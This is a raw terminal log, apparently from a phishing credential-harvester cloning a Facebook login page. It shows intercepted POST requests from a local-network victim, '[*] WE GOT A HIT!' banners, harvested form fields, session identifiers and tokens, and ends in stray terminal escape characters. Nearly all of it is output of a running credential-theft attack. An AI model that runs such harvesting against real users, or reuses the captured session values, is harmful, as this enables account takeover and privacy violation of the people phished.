+[{"app_id":"256281040558","posts":"4QjwaVtbImZhbGNvOmJkX3BkY19zaWduYWxzIix7ImUiOiJ7XCJhc2lkXCI6XCI1ZjIzMGE4ZS03Y2YyLTQ5NGYtOTE1YS0zMWY4MjczODkwNjJcIixcImN0XCI6MTY1OTA4MDM0NSxcInNqZFwBQ/CcdWtzSXd5alg5VHBJcVZYaXVZN1dQZFNhRmxkZ1FyNDF3ZklGMlY5SVpySCs1R2NNdzJ5akdKWXM3YVRzTXN6SmFRbEhTNXRnSFlBSjRXditUOEUzMkxyTVZ1SGZka2VFT245UmFkM2ROcUNvYTZKVFpidUgwcDE2cEhBdzZ6b1NZSDNqTWlMWko5S2xnRHhDT0dtdHB3PT1cIixcIgno9CQBLTF9IiwiciI6MSwiZCI6IiRefEFjWmw3eXRQa2FoY2VFLTNFODVhdXRlaVA1M0hUazh6SXN3TXRsQ0NPTkcxSUtLY3Z5ek9HeVFhSEhES2tmWHFoSl9JZk1iZ00zS3FINlhpcnNtdHZ1cGVleHBNUVpZfGZkLkFjYWo5OWhOU3JXTW9aaHdINmlTSTlORVhZV3dEek9ybENGcFdmQTNXT3hhMmxrak00c2IxaDhMUEMtZ0ZMa01jU0N2N0xOS20xYkxaOXc2LUpHR1gtQ1MiLCJzIjoidzU0ZHV5Oms3aWlkYjpxNGl0YWkiLCJ0IjoxNzA1MDIwNTgwNjU5LjIsImIiOlsxLDBdfSwxNzA1MDIwNjEzNjUxLDQsNTEzXSxbImZhbGP+LwLuLwLwgVdVVnArV28rYi92dkkwRkg3bzFiU2hKOUxxbXhPeEhJQ1JERWVYdkNvMmpUeHI2aEhVV0MwRzVEV0N0a281eWNkUW9IR1hKS0hvdXYydmdiR0NqajNLTWFSYnZUTXZKeDVWUGJ1a21qSEpVM2xVRjBzZ2Z1RHhVaUZOR1hVWVZWQT3+LwL+LwL+LwLuLwJJLyg2MTA2NjYuNSwiYkIvAjg0MzU2My4yLDIsNTEzXV0=","user":"0","webSessionId":"w54duy:k7iidb:q4itai","send_method":"beacon","compression":"snappy_base64","snappy_ms":1},{"app_id":"256281040558","posts":"5AWAW1siZmFsY286b2RzX3dlYl9iYXRjaCIseyJlIjoie1wiBRAkXCI6e1wiMTM0NAkKBTMYLmV2ZW50LgE1VHRpbWVfc3BlbnRfYml0X2FycmF5XCIBNGxqcy51c2VfYmFuemFpLmxvZ19pbW1lZGlhdGVsASMkWzEsbnVsbF0sXAErDScgcG9zdGluZ19lAWEEXCIVJVh9LFwiZmFsY28uZmFicmljLnd3dy5DM/pqAHaWABRwbGFuZXMRmkB3cml0ZV90b190cmFuc3Bvci6fAAnEBbUZKRBxdWV1ZVLEAA0pDGViX3RKPwEu2AANKhF8QlMA9B4BfX19IiwiciI6MSwiZCI6IiRefEFjWmw3eXRQa2FoY2VFLTNFODVhdXRlaVA1M0hUazh6SXN3TXRsQ0NPTkcxSUtLY3Z5ek9HeVFhSEhES2tmWHFoSl9JZk1iZ00zS3FINlhpcnNtdHZ1cGVleHBNUVpZfGZkLkFjYWo5OWhOU3JXTW9aaHdINmlTSTlORVhZV3dEek9ybENGcFdmQTNXT3hhMmxrak00c2IxaDhMUEMtZ0ZMa01jU0N2N0xOS20xYkxaOXc2LUpHR1gtQ1MiLCJzIjoiZDJvbXhqOms3aWlkYjpxNGl0YWkiLCJ0IjoxNzA1MDIwNjU4MTE5LCJiIjpbMSwwXX0sMTcwNTAyMDY5MTAxNS41LDAsNjkyXV0=","user":"0","webSessionId":"d2omxj:k7iidb:q4itai","compression":"snappy_base64","snappy_ms":0}]                                                                           
+------WebKitFormBoundaryjyN7A5dZsDUQzHC7--                                   
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
+                                                                             
+                                                                             
+192.168.0.104 - - [11/Jan/2024 19:51:37] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp61swgE98nwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG78b87C0yE7i0n24o5-0me2218w5uw5Uwdq0Ho2eU5O0PU1mUdEG0hi0Lo6-0iq0NE&__hs=19734.BP%3ADEFAULT.2.0..0.0&__hsi=7323007627383505681&__req=9&__rev=1010784913&__s=d2omxj%3Ak7iidb%3Aq4itai&__spin_b=trunk&__spin_r=1010784913&__spin_t=1705020579&__user=0&dpr=1&jazoest=2902&lsd=AVoM9VtJO_8 HTTP/1.1" 302 -
+[*] WE GOT A HIT! Printing the output:
+POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundaryVsm70TuP0RvbAY6c      
+Content-Disposition: form-data; name="ts"                                    
+                                                                             
+1705020697556                                                                
+------WebKitFormBoundaryVsm70TuP0RvbAY6c                                     
+Content-Disposition: form-data; name="q"                                     
+                                                                             
+[{"app_id":"256281040558","posts":"oAnwVFtbImZhbGNvOndlYl9ibHVlX3RpbWVfc3BlbnRfbmF2aWdhdGlvbiIseyJlIjoie1wianNvbl9kYXRhXCI6XCJ7XFxcInNvdXJjZV9wYXRoXFxcIjoBFEhYV2ViTG9naW5Db250cm9sbGVyARcALAEFDTAQdG9rZW4BEAA6AQUcOTZlODhhZjMBDAUmDGRlc3QZVAxudWxsGRcZOxUYEGNhdXNlAT0FThR1bmxvYWQBDwU1GHNpZF9yYXcBEAUfTGQyb214ajprN2lpZGI6cTRpdGFpAR0ALAEFPGNsaWNrX3BvaW50X2luZm8BFAQ6ewEGEGNsYXNzAQkFRRBfOTd3NAEOAH0FNw3WFGVmX3BhZwmKFZ0NHAR1cgVmBT5kaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2whNgwucGhwBVvw1FwifSIsInIiOjEsImQiOiIkXnxBY1psN3l0UGthaGNlRS0zRTg1YXV0ZWlQNTNIVGs4eklzd010bENDT05HMUlLS2N2eXpPR3lRYUhIREtrZlhxaEpfSWZNYmdNM0txSDZYaXJzbXR2dXBlZXhwTVFaWXxmZC5BY2FqOTloTlNyV01vWmh3SDZpU0k5TkVYWVd3RHpPcmxDRnBXZkEzV094YTJsa2pNNHNiMWg4TFBDLWdGTGtNY1NDdjdMTkttMWJMWjl3Ni1KR0dYLUNTIiwicyI6Ik5/AZAiLCJ0IjoxNzA1MDIwNjY0NjU4LjU5OTksImIiOlsxLDBdfSwxDR4wOTc1NTUsMCw2NDRdLC7CAgB0Wb0gYml0X2FycmF5XbxRBwwiOlwiToQAJFwiLFwic3RhcnQFSgBcGZAcODksXCJ0b3MJUyRcIjpbNDQ3LDBdDRYcY3VtXCI6MjYNDwhpZFwBYwBxSVgBVQE7FGxlblwiOhFJCHNlcQEzAH3+3gH+3gH+3gHe3gEIOS4yYtsBJC42LDAsNDE5XV0=","user":"0","webSessionId":"d2omxj:k7iidb:q4itai","send_method":"beacon","compression":"snappy_base64","snappy_ms":1}]             
+------WebKitFormBoundaryVsm70TuP0RvbAY6c--                                   
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
+                                                                             
+                                                                             
+192.168.0.104 - - [11/Jan/2024 19:51:37] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp61swgE98nwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG78b87C0yE7i0n24o5-0me2218w5uw5Uwdq0Ho2eU5O0PU1mUdEG0hi0Lo6-0iq0NE&__hs=19734.BP%3ADEFAULT.2.0..0.0&__hsi=7323007627383505681&__req=a&__rev=1010784913&__s=d2omxj%3Ak7iidb%3Aq4itai&__spin_b=trunk&__spin_r=1010784913&__spin_t=1705020579&__user=0&dpr=1&jazoest=2902&lsd=AVoM9VtJO_8 HTTP/1.1" 302 -
+^X@sS^X@^[[F^X@sS^[[F^[[F^[[F^[[F^X@sg
